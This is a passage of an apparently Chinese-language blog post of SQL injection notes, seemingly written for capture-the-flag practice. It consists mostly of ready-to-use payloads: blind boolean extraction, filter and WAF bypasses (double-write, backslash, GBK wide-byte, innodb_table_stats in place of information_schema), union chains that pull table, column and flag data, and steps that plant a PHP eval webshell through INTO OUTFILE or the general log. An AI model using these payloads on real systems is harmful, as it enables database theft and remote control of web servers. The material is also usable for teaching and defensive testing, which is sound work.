+id=1 and if(!(ascii(substr((select database()),1,1))<>119),1,0)%23
+
+猜表名
+
+id=1 and if(!(ascii(substr((select group_concat(table_name) from information_schema.tables
+where !(table_schema<>database())),1,1))<>102),1,0)%23
+
+猜列名
+
+id=1 and if(!(ascii(substr((select group_concat(column_name) from information_schema.columns
+where !(table_name<>'flag')),1,1))<>102),1,0)%23
+
+猜数据
+
+id=1 and if(!(ascii(substr((select flag from flag),1,1))<>102),1,0)%23
+
+#### 7.3.2其他绕过方式
+
+Strcmp
+
+id=1 and strcmp(ascii(substr(select database(),1,1)),0x55)
+
+Between and
+
+id=1 and substr(password,1,1) between 't' and 't'
+
+in
+
+id=1 and substr(password,1,1) in ('t')
+
+### 7.4未知列名绕过
+
+columns,column_name等被过滤
+
+#### 7.4.1Union绕过
+
+利用联合查询返回结果集的列名由第一个select后面的列名决定
+
+主要适用于有回显位的情况
+
+payload：
+
+select * from user where id=1 union select 1,a.2,3 from (select 1,2 union select * from flag)a limit 2,1;
+
+这里一共使用了两个union,要保证每个union前后的列数一致
+
+第一个union连接\*和select 1,a.2,3
+
+第二个union连接1,2和*
+
+#### 7.4.2using绕过
+
+使用别名的时候，不允许出现相同的列名
+
+适用于报错的情况,因为using是通过报错信息把列名信息带出来
+
+连接表构造相同的列
+
+select * from user as a join user as b;
+
+再用别名查询一次就会报错
+
+select * from (select *from user as a join user as b)c;
+
+爆第二个列
+
+select * from (select * from user as a join user as b using(id))c;
+
+第三个列
+
+select * from (select * from user as a join user as b using(id,username))c;
+
+### 7.5Str_replace替换导致的问题
+
+#### 7.5.1双写绕过
+
+双写绕过一般是str_replace出现了替换为空的情况,因为str_replace是单次替换,不会在替换了一次之后重新检查字符串能不能再被替换
+
+$username=str_replace('union',", $username);
+
+针对这种方式,就可以利用username=uniunionon 这种形式绕过
+
+#### 7.5.2反斜线绕过
+
+转义代码
+
+把单引号转义成
+$username=str_replace("'", '\\\", $username);
+
+输入              
+
+username=admin' or 1=1%23
+
+经过转义之后
+
+admin\'or 1=1#
+
+这样就阻止了单引号被闭合
+
+##### 7.5.2.1使用\进行绕过
+
+输入username=admin\' or 1=1%23
+
+单引号会被转义成\'
+
+然后我们输入的\不会被转义,就形成username=admin\\\‘or 1=1%23所以我们输入的反斜线,就把服务器添加的反斜线给转义了
+
+##### 7.5.2.2宽字节注入
+
+利用MySQL在进行数据传输时，编码的不一致，导致转义符号\被吃掉，从而绕过转义过滤
+
+\ -> 5c
+
+%df%5c -> 運
+
+因为这里的df大于128，且MySQL使用了gbk编码，所以MySQL会认为df5c是一个汉字，这样就会把刚刚添加的反斜杠吃掉
+
+username=admin%df'转义username=admin%df\'
+
+username=admin運'
+
+注意：第一个字节范围要大于128，才能到达汉字的范围
+
+Payload：
+
+猜测注入点
+
+username=admin%df' or 1=1%23&password=ww
+
+测列数
+
+username=admin%df' order by 3%23&password=ww
+
+测试回显位
+
+username=admin%df' union select 1,2,3%23&password=ww
+
+拿库名
+
+username=admin%df' union select 1,database(),3%23&password=ww
+
+拿表名
+
+username=admin%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&password=ww
+
+拿列名
+
+username=admin%df' union select 1,group_concat(column_name),3 from information_schema.columns where
+table name=0x666c6167%23&password=ww
+
+因为存在转义过滤，直接写table_name='flag'%23可能会被gbk编码吃掉，所以要改成十六进制
+
+拿数据
+
+username=admin%df' union select 1,flag,3 from flag%23&password=ww
+
+### 7.6information绕过
+
+information_schema经常被WAF过滤
+
+Mysql开发团队在5.5.x版本后将innodb作为数据库的默认引擎，在库里增添了两个新表,innodb_index_stats和innodb_table_stats这两个表是数据库自动设置的。存储数据库和对应的数据表。
+
+查库名
+
+select group_concat(database_name) from mysql.innodb_table_stats;
+
+查表名
+
+select group_concat(table_name) from mysql.innodb_table_stats where
+database_name=database();
+
+列名未知，需要用到未知列名绕过
+
+### 7.6sleep函数绕过
+
+## 8.文件操作
+
+### 8.1load_file读文件
+
+SQL注入拿到列名后拿数据时发现数据是一个路径就要使用文件读取来获取数据
+
+### 8.2into outfile写文件
+
+load_file函数被过滤时使用into outfile写入一个webshell，然后利用
+
+直接写：
+
+securr_file_priv限制不严可以直接写到网站根目录下
+
+select " <? php eval($_POST['shell']) ;? >" into outfile 'D:/phpStudy2018/PHPTutorial/WWW/shell.php' ;
+
+直接读取或利用蚁剑连接
+
+shell=readfile('flag.txt');
+
+利用文件包含写：
+
+如果MySQL对文件读写做了限制,只能在指定目录读写。
+
+
+如果服务器有文件包含漏洞的话,就可以利用文件包含+写文件,来getshell
+
+把目录设置为MySQL目录:
+
+secure_file_priv ='D:\phpStudy2018\PHPTutorial\MySQL'
+
+select " <? php eval($_POST['shell']) ;? >" into outfile 'D:/phpStudy2018/PHPTutorial/WWW/shell.php';
+
+确定目录关系利用文件包含或使用蚁剑连接
+
+file =.. /MySQL/shell.php
+
+## 9.getshell
+
+1.select into outfile直接写入
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]) ;?&gt;&quot; <span class="keyword">into</span> outfile <span class="string">&#x27;path&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_GET[&#x27;shell&#x27;]) ;?&gt;&quot; <span class="keyword">into</span> outfile <span class="string">&#x27;path&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+利用条件：
+
+知道绝对路径
+
+目标目录可写，且有权限导入
+
+2.利用日志写shell
+
+利用条件：
+
+root权限
+
+写入步骤：
+
+(1)查看权限
+
+show variables like '%general%';
+
+(2)开启general log模式
+
+set global general_log="On"
+
+(3)设置日志目录为shell地址
+
+set global general_log_file="C:\\phpStudy\\WWW\\shell.php"
+
+3.sqlmap写shell
+
+## 10.漏洞场景
+
+## 利用方式
+
+### load_file()读取敏感文件
+
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
